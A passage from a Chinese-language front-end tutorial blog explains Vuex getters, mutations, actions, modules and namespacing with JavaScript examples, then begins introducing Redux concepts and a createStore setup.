  delAccountCount (state, getters) { return getters.delAccountGet.length }
}
</code></pre>
<p>interface StoreOptions&lt;S&gt; &#x5B9A;&#x4E49; getter &#x53EA;&#x63A5;&#x53D7;&#x4E24;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x82E5;&#x9700;&#x7ED9; getters &#x4F20;&#x53C2;&#xFF0C;&#x90A3;&#x4E48;&#x5E94;&#x8BE5;&#x8BA9; getter &#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#x6765;&#x5B9E;&#x73B0;&#x3002;&#x4F46;&#x662F;&#x8FD9;&#x79CD;&#x5F62;&#x5F0F;&#x4E0D;&#x4F1A;&#x8FDB;&#x884C;&#x7ED3;&#x679C;&#x7684;&#x7F13;&#x5B58;&#x3002;</p>
<pre><code class="language-javascript">getters: {
  // ...
  getASInfoById: (state) =&gt; (id) =&gt; { return state.administrative_staff.find(p =&gt; p.id === id) }
}
</code></pre>
<pre><code class="language-javascript">store.getters.getASInfoById(2) // -&gt; { id: 2, name: &apos;...&apos;, del_flag: false }
</code></pre>
<p>&#x540C;&#x6837;&#x5730;&#xFF0C;&#x4E3A;&#x7B80;&#x5316;&#x5C06;&#x64CD;&#x4F5C;&#x5C5E;&#x6027;&#x6620;&#x5C04;&#x4E3A;&#x7EC4;&#x4EF6;&#x4E2D;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x53EF;&#x901A;&#x8FC7;&#x4F20;&#x5165;&#x5BF9;&#x8C61;&#xFF08;&#x65B9;&#x6CD5;&#x540D;&#x4E0D;&#x540C;&#x4E8E;&#x5C5E;&#x6027;&#x6620;&#x5C04;&#xFF09;&#x6216;&#x6570;&#x7EC4;&#x7684; mapGetters() &#x8F85;&#x52A9;&#x51FD;&#x6570;&#x8FDB;&#x884C;&#x64CD;&#x4F5C;&#x3002;</p>
<pre><code class="language-javascript">import { mapGetters } from &apos;vuex&apos;
export default {
  ...,
  computed: {
    ...mapGetters([ // &#x4F7F;&#x7528;&#x5BF9;&#x8C61;&#x5C55;&#x5F00;&#x8FD0;&#x7B97;&#x7B26;&#x5C06; getter &#x6DF7;&#x5165; computed &#x5BF9;&#x8C61;&#x4E2D;
      &apos;delAccountCount&apos;, &apos;anotherGetter&apos;,
    ])
  }
}
</code></pre>
<ul>
<li>Mutation =&gt; &#x5FC5;&#x987B;&#x662F;&#x540C;&#x6B65;&#x51FD;&#x6570;</li>
</ul>
<p>&#x53D8;&#x66F4; store &#x6570;&#x636E;&#x65F6;&#x4E0D;&#x63A8;&#x8350;&#x76F4;&#x63A5;&#x5BF9; <code>this.$store.state.xx</code> &#x8D4B;&#x503C;&#x6216;&#x8FD0;&#x7B97;&#xFF0C;&#x800C;&#x662F;&#x8981;&#x552F;&#x4E00;&#x7684;&#x901A;&#x8FC7;&#x63D0;&#x4EA4; mutation &#x6765;&#x6539;&#x53D8; store &#x7684;&#x72B6;&#x6001;&#x3002;&#x6BCF;&#x4E2A; mutation &#x90FD;&#x6709;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x4E8B;&#x4EF6;&#x7C7B;&#x578B; type&#xFF0C;&#x4EE5;&#x53CA;&#x4E00;&#x4E2A;&#x56DE;&#x8C03;&#x51FD;&#x6570; handler&#x3002;&#x8FD9;&#x4E2A;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x662F;&#x5B9E;&#x9645;&#x5BF9;&#x72B6;&#x6001;&#x8FDB;&#x884C;&#x66F4;&#x6539;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x4E14;&#x63A5;&#x53D7; state &#x4F5C;&#x4E3A;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x3002;&#x5728; store &#x4E2D;&#x5B9A;&#x4E49;&#x7684; mutation &#x66F4;&#x50CF;&#x662F;&#x4E8B;&#x4EF6;&#x7684;&#x6CE8;&#x518C;&#xFF0C;&#x53EA;&#x80FD;&#x901A;&#x8FC7; store.commit(&apos;mutationName&apos;) &#x89E6;&#x53D1;&#xFF0C;mutationName &#x5BF9;&#x5E94; type&#x3002;</p>
<pre><code class="language-javascript">// store/xxx.js|ts &#x6587;&#x4EF6;
const store = new Vuex.Store({
  state: { &#x6570;&#x636E;&#x540D;:&#x6570;&#x636E;&#x503C;, ... },
  mutations: {
    func01(state, args) {...}, func02(state, args) {...}, func03(state, args) {...},
  }
})
</code></pre>
<pre><code class="language-javascript">// .vue &#x7EC4;&#x4EF6;&#x89E6;&#x53D1; mutation
import { mapMutations } from &apos;vuex&apos;
methods: {
  eventfunc() { this.$store.commit(&apos;func01&apos;) },
  ...mapMutations([&apos;func02&apos;,&apos;func03&apos;])
}
</code></pre>
<p>&#x53EF;&#x4EE5;&#x5411; store.commit &#x4F20;&#x9012;&#x53C2;&#x6570;&#xFF0C;&#x5373;&#x5411; mutation &#x63D0;&#x4EA4;&#x8F7D;&#x8377; Payload&#x3002;&#x8F7D;&#x8377;&#x66F4;&#x591A;&#x65F6;&#x5019;&#x662F;&#x4F20;&#x5165;&#x4E00;&#x4E2A;&#x5305;&#x542B;&#x591A;&#x4E2A;&#x5B57;&#x6BB5;&#x7684;&#x5BF9;&#x8C61;&#x3002;</p>
<pre><code class="language-javascript">// ...
mutations: {
  increment (state, payload) { state.count += payload.amount }
}
</code></pre>
<pre><code class="language-javascript">store.commit(&apos;increment&apos;, { amount: 10 })
</code></pre>
<p>&#x5BF9;&#x8C61;&#x98CE;&#x683C;&#x7684;&#x63D0;&#x4EA4;&#x65B9;&#x5F0F; =&gt; store.commit &#x7684;&#x53C2;&#x6570;&#x53EF;&#x4EE5;&#x9010;&#x4E2A;&#x6307;&#x5B9A;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5BF9;&#x8C61;&#x7684;&#x5F62;&#x5F0F;&#x6307;&#x5B9A;&#x3002;&#x540E;&#x8005;&#x5305;&#x542B;&#x5BF9;&#x5E94; mutation &#x7684; type &#x5B57;&#x6BB5;&#x4EE5;&#x53CA;&#x5176;&#x4ED6;&#x8F7D;&#x8377;&#x5B57;&#x6BB5;&#x3002;</p>
<pre><code class="language-javascript">mutations: {
  increment (state, payload) { state.count += payload.amount }
}
</code></pre>
<pre><code class="language-javascript">store.commit({ type: &apos;increment&apos;, amount: 10 })
</code></pre>
<ul>
<li><a href="https://vuex.vuejs.org/zh/guide/actions.html">Action</a> =&gt; &#x63D0;&#x4EA4; mutation &#x800C;&#x4E0D;&#x662F;&#x76F4;&#x63A5;&#x53D8;&#x66F4;&#x72B6;&#x6001; =&gt; &#x53EF;&#x5F02;&#x6B65;</li>
</ul>
<p>Mutation &#x4E2D;&#x4E0D;&#x80FD;&#x5199;&#x5F02;&#x6B65;&#x4EE3;&#x7801;&#xFF0C;Action &#x53EF;&#x4EE5;&#x5904;&#x7406;&#x5F02;&#x6B65;&#x4EFB;&#x52A1;&#x3002;&#x5F00;&#x53D1;&#x4E2D;&#x901A;&#x5E38;&#x4EE5; Action &#x95F4;&#x63A5;&#x5730;&#x89E6;&#x53D1; Mutation &#x8FBE;&#x5230;&#x53D8;&#x66F4;&#x6570;&#x636E;&#x7684;&#x76EE;&#x7684;&#x3002;</p>
<p>&#x51FD;&#x6570; Action &#x63A5;&#x53D7;&#x4E00;&#x4E2A;&#x4E0E; store &#x5B9E;&#x4F8B;&#x5177;&#x6709;&#x76F8;&#x540C;&#x65B9;&#x6CD5;&#x548C;&#x5C5E;&#x6027;&#x7684; context &#x5BF9;&#x8C61;&#xFF0C;&#x56E0;&#x6B64;&#x53EF;&#x4EE5;&#x8C03;&#x7528; context.commit &#x63D0;&#x4EA4; mutation&#xFF0C;&#x6216;&#x901A;&#x8FC7; context.state &#x548C; context.getters &#x6765;&#x83B7;&#x53D6; state &#x548C; getters&#x3002;&#x5F00;&#x53D1;&#x4E2D;&#x53EF;&#x7528;&#x53C2;&#x6570;&#x89E3;&#x6784;&#x6765;&#x7B80;&#x5316;&#x591A;&#x6B21;&#x8C03;&#x7528; commit &#x7684;&#x60C5;&#x51B5;&#x3002;</p>
<pre><code class="language-typescript">/* ActionContext &#x6E90;&#x7801; */
export interface ActionContext&lt;S, R&gt; {
  dispatch: Dispatch;
  commit: Commit;
  state: S;
  getters: any;
  rootState: R;
  rootGetters: any;
}
</code></pre>
<pre><code class="language-javascript">// store/xxx.js|ts
const store = new Vuex Store({
  ...
  mutations: { func01(state) { ... }, func02(state, args) { ... }, ... },
  actions: {
    func01Sync({ commit }) { // ES2015 &#x53C2;&#x6570;&#x89E3;&#x6784;
      commit(&apos;func01&apos;)
    },
	func02Async(context, payload) {
	  setTimeout(() =&gt; { context.commit(&apos;func02&apos;, payload.args01) }, 1000)
	},
    incrementAsync(context, acc) { ... },...
  }
})
</code></pre>
<p>Action &#x901A;&#x8FC7; store.dispatch &#x65B9;&#x6CD5;&#x89E6;&#x53D1;&#x3002;&#x82E5;&#x5728;&#x7EC4;&#x4EF6;&#x4E2D;&#x6D89;&#x53CA;&#x5230;&#x5F02;&#x6B65;&#x64CD;&#x4F5C;&#xFF0C;&#x90A3;&#x4E48;&#x8FD8;&#x662F;&#x5F97;&#x5206;&#x6D3E; Action &#x518D;&#x63D0;&#x4EA4;&#x901A;&#x77E5;&#x7ED9;&#x5FC5;&#x987B;&#x540C;&#x6B65;&#x6267;&#x884C;&#x7684; Mutation &#x6539;&#x53D8;&#x6570;&#x636E;&#x3002;&#x6B64;&#x5916; Actions &#x652F;&#x6301;&#x540C;&#x6837;&#x7684;&#x8F7D;&#x8377;&#x65B9;&#x5F0F;&#x548C;&#x5BF9;&#x8C61;&#x65B9;&#x5F0F;&#x8FDB;&#x884C;&#x5206;&#x53D1;&#x3002;</p>
<pre><code class="language-javascript">// &#x7EC4;&#x4EF6;&#x5206;&#x53D1; Actions
import { mapActions } from &apos;vuex&apos;
methods: {
  ...mapActions([&apos;func01Sync&apos;, &apos;...&apos;]), // &#x6620;&#x5C04;&#x5BFC;&#x5165;&#x540E;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x7ED1;&#x5B9A;&#x5230;&#x4E8B;&#x4EF6;
  eventfunc() { this.$store.dispatch(&apos;func02ASync&apos;, {args01:&apos;zs&apos;}) }, // &#x8F7D;&#x8377;&#x65B9;&#x5F0F;&#x5206;&#x53D1;
  patchEventByObject() { this.$store.dispatch({ type: &apos;incrementAsync&apos;, amount: 10 }) // &#x5BF9;&#x8C61;&#x65B9;&#x5F0F;&#x5206;&#x53D1;
  }
}
</code></pre>
<pre><code class="language-javascript">// Action &#x8FDB;&#x884C;&#x5F02;&#x6B65;&#x64CD;&#x4F5C;
const module_user = {
  namespaced: true,
  state: () =&gt; ({...}), mutations: {...}, getters: {...},
  actions: {
    ...
    addUserByServer (context) {
      axios.get(&quot;&quot;).then(response =&gt; { // &#x9ED8;&#x8BA4;&#x5F15;&#x5165; axios &#x4E0E; nanoid
        context.commit(ADD_USER, {id:nanoid(),username:response.data})
      },error =&gt; {...})
    }
  }
}
</code></pre>
<ul>
<li>module</li>
</ul>
<p>&#x867D;&#x7136;&#x5355;&#x4E00;&#x72B6;&#x6001;&#x6811;&#x4F1A;&#x4F7F;&#x5E94;&#x7528;&#x7684;&#x6240;&#x6709;&#x72B6;&#x6001;&#x96C6;&#x4E2D;&#xFF0C;&#x4F46;&#x662F;&#x5F53;&#x5E94;&#x7528;&#x53D8;&#x5F97;&#x590D;&#x6742;&#x65F6;&#xFF0C;&#x4EE3;&#x7801;&#x5C31;&#x4F1A;&#x53D8;&#x5F97;&#x81C3;&#x80BF;&#x3002;&#x4E3A;&#x6B64; Vuex &#x5141;&#x8BB8;&#x5C06; store &#x5206;&#x5272;&#x6210;&#x6A21;&#x5757; module&#x3002;&#x6BCF;&#x4E2A;&#x6A21;&#x5757; module &#x62E5;&#x6709;&#x5404;&#x81EA;&#x7684; state&#x3001;mutation&#x3001;action&#x3001;getter&#x3001;&#x751A;&#x81F3;&#x662F;&#x5D4C;&#x5957;&#x5B50;&#x6A21;&#x5757;&#x3002;</p>
<pre><code class="language-javascript">const moduleA = { state: () =&gt; ({ ... }), mutations: { ... }, actions: { ... }, getters: { ... } }
const moduleB = { state: () =&gt; ({ ... }), mutations: { ... }, actions: { ... } }
// Vuex3
const store = new Vuex.Store({
  modules: { a: moduleA, b: moduleB }
})
// Vuex4
// const store = createStore({ modules: { a: moduleA, b: moduleB } })
store.state.a // -&gt; moduleA &#x7684;&#x72B6;&#x6001;
store.state.b // -&gt; moduleB &#x7684;&#x72B6;&#x6001;
</code></pre>
<p>&#x56E0; store &#x88AB;&#x5206;&#x5272;&#x6210;&#x6A21;&#x5757; module&#xFF0C;&#x90A3;&#x4E48;&#x6BCF;&#x4E2A;&#x6A21;&#x5757;&#x7684; state &#x90FD;&#x662F;&#x5C40;&#x90E8;&#x72B6;&#x6001;&#x3002;&#x6A21;&#x5757;&#x5185;&#x90E8;&#x7684; mutation &#x548C; getter &#x63A5;&#x6536;&#x7684;&#x9996;&#x4E2A;&#x53C2;&#x6570;&#x662F;&#x6A21;&#x5757;&#x7684;&#x5C40;&#x90E8;&#x72B6;&#x6001;&#x5BF9;&#x8C61;&#xFF0C;&#x540E;&#x8005;&#x6240;&#x9700;&#x7684; rootState &#x6839;&#x8282;&#x70B9;&#x72B6;&#x6001;&#x4F1A;&#x4F5C;&#x4E3A;&#x7B2C;&#x4E09;&#x4E2A;&#x53C2;&#x6570;&#x66B4;&#x9732;&#x51FA;&#x6765;&#x3002;&#x540C;&#x6837;&#x5BF9;&#x4E8E;&#x6A21;&#x5757;&#x5185;&#x90E8;&#x7684; action&#xFF0C;&#x5C40;&#x90E8;&#x72B6;&#x6001;&#x4EE5;&#x53CA;&#x6839;&#x8282;&#x70B9;&#x72B6;&#x6001;&#x90FD;&#x662F;&#x901A;&#x8FC7; context.??? &#x66B4;&#x9732;&#x3002;</p>
<pre><code class="language-javascript">/* &#x6E90;&#x7801;&#x5206;&#x6790; */
export type Mutation&lt;S&gt; = (state: S, payload?: any) =&gt; any;
export type Getter&lt;S, R&gt; = (state: S, getters: any, rootState: R, rootGetters: any) =&gt; any;
export interface ActionContext&lt;S, R&gt; { dispatch: Dispatch; commit: Commit; state: S; getters: any; rootState: R; rootGetters: any; }
</code></pre>
<ul>
<li>&#x547D;&#x540D;&#x7A7A;&#x95F4; =&gt; namespaced: true</li>
</ul>
<p>&#x6A21;&#x5757;&#x5185;&#x90E8;&#x7684; action&#x3001;mutation&#x3001;getter &#x9ED8;&#x8BA4;&#x6CE8;&#x518C;&#x5728;&#x5168;&#x5C40;&#x547D;&#x540D;&#x7A7A;&#x95F4;&#xFF0C;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x53EF;&#x4EE5;&#x8BA9;&#x591A;&#x4E2A;&#x6A21;&#x5757;&#x5BF9;&#x5176;&#x8FDB;&#x884C;&#x64CD;&#x4F5C;&#xFF0C;&#x4F46;&#x662F;&#x5982;&#x679C;&#x5728;&#x4E0D;&#x540C;&#x7684;&#x3001;&#x65E0;&#x547D;&#x540D;&#x7A7A;&#x95F4;&#x7684;&#x6A21;&#x5757;&#x4E2D;&#x5B9A;&#x4E49;&#x4E24;&#x4E2A;&#x76F8;&#x540C;&#x7684; action&#x3001;mutation &#x6216; getter&#xFF0C;&#x90A3;&#x4E48;&#x4F1A;&#x51FA;&#x73B0;&#x8986;&#x76D6;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x4E3B;&#x8981;&#x8868;&#x73B0;&#x662F;&#x540E;&#x5B9A;&#x4E49;&#x7684;&#x8986;&#x76D6;&#x524D;&#x5B9A;&#x4E49;&#x7684;&#x3002;</p>
<p>&#x5728;&#x6A21;&#x5757;&#x5BF9;&#x8C61;&#x4E2D;&#x8BBE;&#x7F6E;&#x5B57;&#x6BB5; <code>namespaced: true</code>&#xFF0C;&#x4F1A;&#x4F7F;&#x5176;&#x6210;&#x4E3A;&#x5E26;&#x547D;&#x540D;&#x7A7A;&#x95F4;&#x7684;&#x6A21;&#x5757;&#x3002;&#x8FD9;&#x7C7B;&#x6A21;&#x5757;&#x6CE8;&#x518C;&#x540E;&#xFF0C;getter&#x3001;action &#x53CA; mutation &#x90FD;&#x4F1A;&#x81EA;&#x52A8;&#x636E;&#x6A21;&#x5757;&#x6CE8;&#x518C;&#x8DEF;&#x5F84;&#x8C03;&#x6574;&#x547D;&#x540D;&#x3002;</p>
<table>
<thead>
<tr>
<th style="text-align:center"></th>
<th style="text-align:center">&#x5F00;&#x542F;&#x547D;&#x540D;&#x7A7A;&#x95F4;&#x540E;&#x7EC4;&#x4EF6;&#x8BFB;&#x53D6; State &#x6570;&#x636E;</th>
<th style="text-align:center">&#x5F00;&#x542F;&#x547D;&#x540D;&#x7A7A;&#x95F4;&#x540E;&#x7EC4;&#x4EF6;&#x8BFB;&#x53D6; Getter &#x6570;&#x636E;</th>
<th style="text-align:center">&#x5F00;&#x542F;&#x547D;&#x540D;&#x7A7A;&#x95F4;&#x540E;&#x7EC4;&#x4EF6;&#x8C03;&#x7528; Dispatch</th>
<th style="text-align:center">&#x5F00;&#x542F;&#x547D;&#x540D;&#x7A7A;&#x95F4;&#x540E;&#x7EC4;&#x4EF6;&#x8C03;&#x7528; Commit</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">&#x76F4;&#x63A5;&#x8BFB;&#x53D6;</td>
<td style="text-align:center">this.$store.state.moduleA.data01</td>
<td style="text-align:center">this.$store.getters[&apos;moduleA/getter01&apos;]</td>
<td style="text-align:center">this.$store.dispatch(&apos;moduleA/action01&apos;,args)</td>
<td style="text-align:center">this.$store.commit(&apos;moduleA/mutation01&apos;,args)</td>
</tr>
<tr>
<td style="text-align:center">&#x501F;&#x52A9; mapXxx &#x8BFB;&#x53D6;</td>
<td style="text-align:center">...mapState(&apos;moduleA&apos;, [&apos;data01&apos;,...])</td>
<td style="text-align:center">...mapGetters(&apos;moduleA&apos;,[&apos;getter01&apos;,...])</td>
<td style="text-align:center">...mapActions(&apos;moduleA&apos;,{methodName01:&apos;action01&apos;,...})</td>
<td style="text-align:center">...mapMutations(&apos;moduleA&apos;,{method01:&apos;mutation01&apos;,...})</td>
</tr>
</tbody>
</table>
<p>&#x7B80;&#x8BB0;&#xFF1A;&#x65E0;&#x6548;&#x5FE0;&#x3001;&#x5FE0;&#x6548;&#x5FE0;&#x3001;&#x7B11;&#x7B11;&#x6253;</p>
<blockquote>
<p>&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6A21;&#x5757;&#x5185;&#x90E8;&#x7684; action &#x548C; mutation &#x4ECD;&#x7136;&#x662F;&#x6CE8;&#x518C;&#x5728;&#x5168;&#x5C40;&#x547D;&#x540D;&#x7A7A;&#x95F4;&#x7684;&#x2014;&#x2014;&#x8FD9;&#x6837;&#x4F7F;&#x5F97;&#x591A;&#x4E2A;&#x6A21;&#x5757;&#x80FD;&#x591F;&#x5BF9;&#x540C;&#x4E00;&#x4E2A; action &#x6216; mutation &#x4F5C;&#x51FA;&#x54CD;&#x5E94;&#x3002;Getter &#x540C;&#x6837;&#x4E5F;&#x9ED8;&#x8BA4;&#x6CE8;&#x518C;&#x5728;&#x5168;&#x5C40;&#x547D;&#x540D;&#x7A7A;&#x95F4;&#xFF0C;&#x4F46;&#x662F;&#x76EE;&#x524D;&#x8FD9;&#x5E76;&#x975E;&#x51FA;&#x4E8E;&#x529F;&#x80FD;&#x4E0A;&#x7684;&#x76EE;&#x7684;&#xFF08;&#x4EC5;&#x4EC5;&#x662F;&#x7EF4;&#x6301;&#x73B0;&#x72B6;&#x6765;&#x907F;&#x514D;&#x975E;&#x517C;&#x5BB9;&#x6027;&#x53D8;&#x66F4;&#xFF09;&#x3002;&#x5FC5;&#x987B;&#x6CE8;&#x610F;&#xFF0C;&#x4E0D;&#x8981;&#x5728;&#x4E0D;&#x540C;&#x7684;&#x3001;&#x65E0;&#x547D;&#x540D;&#x7A7A;&#x95F4;&#x7684;&#x6A21;&#x5757;&#x4E2D;&#x5B9A;&#x4E49;&#x4E24;&#x4E2A;&#x76F8;&#x540C;&#x7684; getter &#x4ECE;&#x800C;&#x5BFC;&#x81F4;&#x9519;&#x8BEF;&#x3002;<a href="https://vuex.vuejs.org/zh/guide/modules.html#%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4">&#x70B9;&#x6B64;</a>&#x3002;</p>
</blockquote>
<p>&#x6A21;&#x5757;&#x5185;&#x672A;&#x6307;&#x660E; <code>namespaced: true</code> &#x65F6;&#xFF0C;&#x9664; state &#x5916;&#xFF0C;getters &amp; mutation &amp; action &#x9ED8;&#x8BA4;&#x6CE8;&#x518C;&#x5728;&#x5168;&#x5C40;&#x3002;</p>
<pre><code class="language-javascript">// &#x4F7F;&#x7528; A &#x6A21;&#x5757;&#x5185;&#x7684; getters &#x6570;&#x636E; -&gt; &#x672A;&#x6307;&#x660E;&#x547D;&#x540D;&#x7A7A;&#x95F4;&#x4E3A;&#x771F;
$store.getters.getter01 =&gt; yes
$store.getters.moduleA.getter01 =&gt; no
</code></pre>
<h3 id="%E5%B0%8F%E7%BB%93">&#x5C0F;&#x7ED3;</h3>
<ul>
<li>
<p>&#x548C; getters &#x914D;&#x7F6E;&#x9879;&#x529F;&#x80FD;&#x7C7B;&#x4F3C;&#x7684; computed &#x5C5E;&#x6027;&#x867D;&#x7136;&#x53EF;&#x4EE5;&#x5B8C;&#x6210;&#x8FD0;&#x7B97;&#x529F;&#x80FD;&#xFF0C;&#x4F46;&#x5374;&#x4EC5;&#x80FD;&#x5728;&#x5F53;&#x524D;&#x7EC4;&#x4EF6;&#x4E2D;&#x751F;&#x6548;&#xFF0C;&#x4E0D;&#x80FD;&#x590D;&#x7528;</p>
</li>
<li>
<p>&#x5F00;&#x53D1;&#x4E2D;&#x6700;&#x597D;&#x4F7F;&#x7528;&#x7B80;&#x5355;&#x7684;&#x6A21;&#x677F;&#x8BED;&#x6CD5;&#x800C;&#x4E0D;&#x8981;&#x8FC7;&#x957F;&#x7684;&#x63D2;&#x503C;&#x8BED;&#x6CD5;&#xFF0C;&#x6240;&#x4EE5;&#x8BF4;&#x4ECE; vuex &#x5F15;&#x5165;&#x7684; mapXxx &#x7684;&#x610F;&#x4E49;&#x662F;&#x5E2E;&#x52A9;&#x7B80;&#x5316;&#x53D6;&#x503C;&#x7684;&#x8FC7;&#x7A0B;</p>
</li>
</ul>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="redux">Redux</h2>
<h3 id="concepts-api">Concepts &amp; API</h3>
<ul>
<li>Flux &#x662F;&#x5F3A;&#x5236;&#x5355;&#x5411;&#x6570;&#x636E;&#x6D41;&#x7684;&#x67B6;&#x6784;</li>
</ul>
<p>&#x8BE5;&#x6A21;&#x5F0F;&#x63A7;&#x5236;&#x6D3E;&#x751F;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x901A;&#x8FC7;&#x4E2D;&#x592E;&#x5B58;&#x50A8;&#x6765;&#x652F;&#x6301;&#x7EC4;&#x4EF6;&#x95F4;&#x7684;&#x901A;&#x4FE1;&#x3002;&#x6574;&#x4E2A;&#x5E94;&#x7528;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x66F4;&#x65B0;&#x5728;&#x6B64;&#x5B8C;&#x6210;&#x3002;</p>
<p>Redux &#x662F;&#x7531; Flux &#x884D;&#x751F;&#x7684;&#x67B6;&#x6784;&#x6A21;&#x5F0F;&#xFF0C;&#x7528;&#x4E8E;&#x96C6;&#x4E2D;&#x7BA1;&#x7406;&#x591A;&#x4E2A;&#x7EC4;&#x4EF6;&#x6240;&#x5171;&#x4EAB;&#x7684;&#x72B6;&#x6001;&#x3002;</p>
<p>Redux &#x4E2D;&#x53EA;&#x80FD;&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x53EF;&#x4EE5;&#x66F4;&#x65B0;&#x72B6;&#x6001;&#x7684; store&#xFF0C;Flux &#x4E2D;&#x53EF;&#x4EE5;&#x5B9A;&#x4E49;&#x591A;&#x4E2A; store&#x3002;</p>
<ul>
<li>Redux &#x548C; React-redux &#x5E76;&#x975E;&#x540C;&#x4E00;&#x79CD;&#x4E1C;&#x897F;</li>
</ul>
<p>React-redux &#x5C31;&#x662F;&#x628A; Redux &#x67B6;&#x6784;&#x6A21;&#x5F0F;&#x548C; Reactjs &#x7ED3;&#x5408;&#x8D77;&#x6765;&#x7684;&#x5B98;&#x65B9;&#x5E93;&#xFF0C;&#x5373; Redux &#x67B6;&#x6784;&#x5728; React &#x4E2D;&#x7684;&#x4F53;&#x73B0;&#x3002;</p>
<p><img src="https://www.zairesinatra.com/content/images/2021/12/redux---.png" alt="&#x7EC4;&#x4EF6;&#x901A;&#x8BAF;" loading="lazy"></p>
<ul>
<li>action =&gt; &#x5177;&#x6709; type &#x548C; data &#x5C5E;&#x6027;&#x7684;&#x4E00;&#x822C;&#x5BF9;&#x8C61;</li>
</ul>
<blockquote>
<p>&#x552F;&#x4E00;&#x6539;&#x53D8;&#x72B6;&#x6001;&#x6811; state tree &#x7684;&#x65B9;&#x6CD5;&#x662F;&#x521B;&#x5EFA; action&#xFF0C;&#x4E00;&#x4E2A;&#x63CF;&#x8FF0;&#x53D1;&#x751F;&#x4E86;&#x4EC0;&#x4E48;&#x7684;&#x5BF9;&#x8C61;&#xFF0C;&#x5E76;&#x5C06;&#x5176; dispatch &#x7ED9; store&#x3002;</p>
</blockquote>
<ul>
<li>
<p>store =&gt; getState&#x3001;dispatch&#x3001;subscribe API</p>
</li>
<li>
<p>reducer =&gt; &#x63A5;&#x6536;&#x5F53;&#x524D;&#x72B6;&#x6001; previousState &#x4E0E;&#x52A8;&#x4F5C; action&#xFF0C;&#x8FD4;&#x56DE;&#x65B0; state &#x503C;</p>
</li>
</ul>
<p>reducer &#x672C;&#x8D28;&#x662F;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#xFF0C;&#x7528;&#x4E8E;&#x6307;&#x5B9A;&#x72B6;&#x6001;&#x6811;&#x5982;&#x4F55;&#x54CD;&#x5E94; action &#x6765;&#x8FDB;&#x884C;&#x521D;&#x59CB;&#x5316;&#x548C;&#x66F4;&#x65B0;&#x3002;</p>
<p>&#x521D;&#x59CB;&#x5316;&#x9ED8;&#x8BA4; previousState &#x4E3A; undefined&#xFF0C;action &#x7684; type &#x4E3A; &quot;@@redux/INIT...&quot;&#x3002;</p>
<p>&#x8FD4;&#x56DE;&#x66F4;&#x6539;&#x7684;&#x72B6;&#x6001;&#x9ED8;&#x8BA4;&#x4E0D;&#x4F1A;&#x5F15;&#x8D77;&#x9875;&#x9762;&#x7684;&#x66F4;&#x65B0;&#x3002;&#x53EF;&#x5728;&#x5BF9;&#x5E94;&#x7EC4;&#x4EF6;&#x7684; componentDidMount &#x751F;&#x547D;&#x5468;&#x671F;&#x4E2D;&#x4F7F;&#x7528; <code>store.subscribe(()=&gt;{})</code> &#x8BBE;&#x7F6E;&#x72B6;&#x6001;&#x53D8;&#x5316;&#x7684;&#x76D1;&#x542C;&#x51FD;&#x6570;&#x3002;</p>
<pre><code class="language-jsx">export default class Xxx extends Component {
  ...
  conponentDidMount(){
    store.subscribe(() =&gt; this.setState({})) // &#x89E6;&#x53D1;&#x9875;&#x9762;&#x66F4;&#x65B0;
  }
}
</code></pre>
<p>redux &#x91CC;&#x4EFB;&#x610F;&#x72B6;&#x6001;&#x7684;&#x6539;&#x53D8;&#x90FD;&#x4F1A;&#x89E6;&#x53D1; subscribe &#x4E2D;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x7684;&#x6267;&#x884C;&#x3002;</p>
<pre><code class="language-jsx">// &#x4F18;&#x5316;&#x89E6;&#x53D1;&#x66F4;&#x65B0; =&gt; &#x5E94;&#x7528;&#x7684; index.js &#x6587;&#x4EF6;&#x4E2D;&#x5305;&#x88F9;&#x5E94;&#x7528;&#x7684;&#x6E32;&#x67D3;
store.subscribe(() =&gt; {ReactDOM.render(&lt;App/&gt;, document.getElementById(&quot;root&quot;))})
</code></pre>
<h3 id="quick-start">Quick Start</h3>
<p>createStore &#x51FD;&#x6570;&#x7528;&#x4E8E;&#x751F;&#x6210;&#x6574;&#x4E2A;&#x5E94;&#x7528;&#x552F;&#x4E00;&#x4FDD;&#x5B58;&#x6570;&#x636E;&#x7684;&#x5BB9;&#x5668; Store&#x3002;</p>
<pre><code class="language-javascript">/* 
  store.js &#x7528;&#x4E8E;&#x66B4;&#x9732; store &#x5BF9;&#x8C61;&#xFF0C;&#x6574;&#x4E2A;&#x5E94;&#x7528;&#x53EA;&#x6709;&#x4E00;&#x4E2A; store &#x5BF9;&#x8C61;
*/
//&#x5F15;&#x5165;createStore&#xFF0C;&#x4E13;&#x95E8;&#x7528;&#x4E8E;&#x521B;&#x5EFA;redux&#x4E2D;&#x6700;&#x4E3A;&#x6838;&#x5FC3;&#x7684;store&#x5BF9;&#x8C61;
import { createStore, applyMiddleware } from &quot;redux&quot;;
//&#x5F15;&#x5165;&#x4E3A;Count&#x7EC4;&#x4EF6;&#x670D;&#x52A1;&#x7684;reducer
import countReducer from &quot;./count_reducer&quot;;
//&#x5F15;&#x5165;redux-thunk&#xFF0C;&#x7528;&#x4E8E;&#x652F;&#x6301;&#x5F02;&#x6B65;action
import thunk from &quot;redux-thunk&quot;;
//&#x66B4;&#x9732;store
export default createStore(countReducer, applyMiddleware(thunk));
</code></pre>
